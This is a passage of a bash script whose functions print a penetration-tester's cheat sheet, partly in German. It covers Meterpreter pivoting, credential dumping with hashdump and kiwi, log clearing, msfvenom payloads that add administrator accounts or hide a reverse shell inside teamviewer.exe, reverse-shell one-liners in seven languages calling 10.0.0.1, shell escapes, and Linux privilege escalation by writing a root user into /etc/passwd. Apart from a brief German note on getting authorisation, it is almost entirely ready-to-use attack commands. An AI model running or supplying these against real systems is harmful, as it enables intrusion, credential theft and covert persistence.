# Beispielinhalt script.rc:
# use exploit/...
# set RHOSTS ...
# run

${BLUEBOLD}## 9. Pivoting mit Meterpreter (Vorsicht in Prod)${RESET}
# SOCKS Proxy via Meterpreter
run autoroute -s 10.0.0.0/24
run migrate -n
run post/multi/manage/socks_proxy  # erst nach Prüfung und Freigabe

${BLUEBOLD}## 10. Cleanup & Spurenreduzierung (verantwortungsvoll)${RESET}
# Beende Sessions sauber
sessions -k 1
# Entferne temporäre Dateien, Meterpreter-Uploads, explizit erstellte Backdoors (nur wenn du es zuvor angelegt hast und mit Zustimmung)
# Dokumentiere Commands & Beweise (pcaps, logs, screenshots)

${BLUEBOLD}## 11. Sicherheits- & Governance-Richtlinien${RESET}
- Führe keine unerlaubten Privilege Escalations oder Persistenzmechanismen in Prod aus.  
- Informiere SOC/Operations vor lauten Aktionen (z. B. massenhaftes Scanning, Exploits mit DoS-Risiko).  
- Priorisiere Proof-of-Concepts, die Auswirkungen minimieren, aber Exploitbarkeit klar belegen.

${BLUEBOLD}## 12. Troubleshooting & Tipps${RESET}
- Modul schlägt fehl: prüfe RHOSTS, RPORT, TARGET, ABILITY des Moduls (info) und evtl. required services.  
- Kein Session? Prüfe LHOST Erreichbarkeit, Firewall, AV/EDR-Reaktionen.  
- Nutze verbose / debug-Ausgaben für tiefergehende Analyse.

${BLUEBOLD}## 13. Nützliche Befehle (Referenz)${RESET}
# DB / Workspace
workspace -a engagement_name
db_status
hosts; services

# Module flow
search type:exploit name:tomcat
use exploit/multi/http/struts_execute
set RHOSTS 10.0.0.5
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 10.0.0.1
exploit -j

# Handler manuell starten
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 4444
exploit -j

${YELLOW}================================================================================${RESET}
${CYAN}--------------------------------------------------------------------------------${RESET}
${YELLOW}================================================================================${RESET}
"
}


my_metasploit_exploits(){
echo -e "
${YELLOW}================================================================================${RESET}
msf> search platform:windows port:135 target:XP type:exploit
${BLUE}================================================================================
===Meterpreter Cheat Sheet${RESET}
upload file c:\\windows
download c:\\windows\\\repair\\sam /tmp
execute -f c:\\windows\\\temp\\exploit.exe
execute -f cmd -c
ps
shell
edit      	# Edit a file in vi editor
getsystem
migrate 
clearev      	# Clear the system logs
hashdump
getprivs    	# Shows multiple privileges as possible
portfwd add –l 3389 –p 3389 –r target
portfwd delete –l 3389 –p 3389 –r target
${BLUE}================================================================================
===Metasploit Modules${RESET}
use exploit/windows/local/bypassuac
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/http/jboss_vulnscan
use auxiliary/scanner/mssql/mssql_login
use auxiliary/scanner/mysql/mysql_version
post/windows/manage/powershell/exec_powershell
use exploit/multi/http/jboss_maindeployer
use exploit/windows/mssql/mssql_payload
run post/windows/gather/win_privs
use post/windows/gather/credentials/gpp
use post/windows/gather/hashdump
${BLUE}================================================================================
=====Metasploit Modules
===Mimikatz/kiwi${RESET}
load kiwi
creds_all
run post/windows/gather/local_admin_search_enum
set AUTORUNSCRIPT post/windows/manage/migrate
${BLUE}================================================================================
===Meterpreter Payloads${RESET}
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD='net localgroup administrators shaun /add' -f exe > pay.exe
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe -x teamviewer.exe > encoded.exe
"
}

my_breakout(){
echo -e "
${YELLOW}================================================================================${RESET}
${BLUE}================================================================================
===repair the shell after nc connection${RESET}
python -c 'import pty; pty.spawn(\"/bin/bash\")'
# OR
python3 -c 'import pty; pty.spawn(\"/bin/bash\")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
Keyboard Shortcut: Ctrl + Z (Background Process.)
stty raw -echo ; fg ; reset
stty columns 200 rows 200
${BLUE}================================================================================
===rbash - Is this rbash (Restricted Bash)?${RESET}
$ vi
:set shell=/bin/sh
:shell

$ vim
:set shell=/bin/sh
:shell
${BLUE}================================================================================
===perl - Is perl present on the target machine?${RESET}
perl -e 'exec \"/bin/bash\";'
perl -e 'exec \"/bin/sh\";'
${BLUE}================================================================================
===AWK - Is AWK present on the target machine?${RESET}
awk 'BEGIN {system(\"/bin/bash -i\")}'
awk 'BEGIN {system(\"/bin/sh -i\")}'
${BLUE}================================================================================
===ed - Is ed present on the target machines?${RESET}
ed
!sh
${BLUE}================================================================================
===IRB - IRB Present on the target machine?${RESET}
exec '/bin/sh'
${BLUE}================================================================================
===Nmap - Is Nmap present on the target machine?${RESET}
nmap --interactive
nmap> !sh
${BLUE}================================================================================${RESET}
"
}


## reverseshell:
my_reverseshell(){
echo -e "
${YELLOW}================================================================================${RESET}
${BLUEBOLD}======Bash${RESET}"
echo "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"

echo -e "${BLUEBOLD}======PERL${RESET}"
echo perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

echo -e "${BLUEBOLD}======Python${RESET}"
echo python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

echo -e "${BLUEBOLD}======PHP${RESET}"
echo php -r '$sock=fsockopen("10.0.0.1",1w234);exec("/bin/sh -i <&3 >&3 2>&3");'

echo -e "${BLUEBOLD}======Ruby${RESET}"
echo ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

echo -e "${BLUEBOLD}======Netcat${RESET}"
echo nc -e /bin/sh 10.0.0.1 1234

echo -e "${BLUEBOLD}======java${RESET}"
echo 'r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();'

echo -e "\n${RED}https://www.revshells.com/${RESET}\n"
}
my_linuxpriv(){
echo -e "
${YELLOW}================================================================================${RESET}
${BLUE}================================================================================
===better shell on target ${RESET}
python -c 'import pty; pty.spawn(\"/bin/bash\")'
OR
python3 -c 'import pty; pty.spawn(\"/bin/bash\")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
Ctrl + Z [Background Process]
stty raw -echo ; fg ; reset
stty columns 200 rows 200
${BLUE}================================================================================${RESET}
${BLUE}===kernel?${RESET}
uname -a
cat /etc/*-release
${BLUE}===/etc/passwd writable?${RESET}
ls -lsa /etc/passwd

openssl passwd -1
password123
$1$v6KYhidX$D.NBumRd1Lsr3LCw4mFrj/
echo 'ibrahim:$1$v6KYhidX$D.NBumRd1Lsr3LCw4mFrj/:0:0:ibrahim:/home/ibrahim:/bin/bash' >> /etc/passwd
su ibrahim
id
${BLUE}===sudo?${RESET}
sudo -l
${BLUE}===environmental variables?${RESET}
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
${BLUE}===What has the user being doing? passwords?${RESET}
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
${BLUE}===Private-key information?${RESET}
cd ~/.ssh/
${BLUE}===file-systems mounted?${RESET}
mount
df -h
${BLUE}===Web Configs containing credentials?${RESET}
cd /var/www/html/
ls -lsaht
${BLUE}===SUID Binaries?${RESET}
find / -perm -u=s -type f 2>/dev/null
${BLUE}===GUID Binaries?${RESET}
find / -perm -g=s -type f 2>/dev/null
-> https://gtfobins.github.io/
${BLUE}===any sensitive on?${RESET}
ls -lsaht /opt/
ls -lsaht /tmp/
ls -lsaht /var/tmp/
ls -lsaht /dev/shm/
${BLUE}===What does the local network look like?${RESET}
netstat -antup
netstat -tunlp
${BLUE}===Is anything vulnerable running as root?${RESET}
ps aux |grep -i 'root' --color=auto
${BLUE}===Are there any .secret files?${RESET}
ls -lsaht |grep -i '.secret' --color=aut 2>/dev/null
${BLUE}===cron jobs?${RESET}
crontab –u root –l
cat /etc/fstab
${BLUE}===Look for unusual system-wide cron jobs:${RESET}
cat /etc/crontab
ls /etc/cron.*
${BLUE}===What is every single file ibrahim has ever created?${RESET}
find / -user ibrahim 2>/dev/null
${BLUE}===Any backups??${RESET}
find / -type f \\( -name "*.bak" -o -name "*.sav" -o -name "*.backup" -o -name "*.old" \\) 2>/dev/null
${BLUE}===Any mail? mbox in User \$HOME directory?${RESET}
cd /var/mail/
ls -lsaht
${BLUE}===automation?${RESET}
Linpease
Traitor
${BLUE}===other resources${RESET}
'https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/'
'https://github.com/sleventyeleven/linuxprivchecker'
"
}

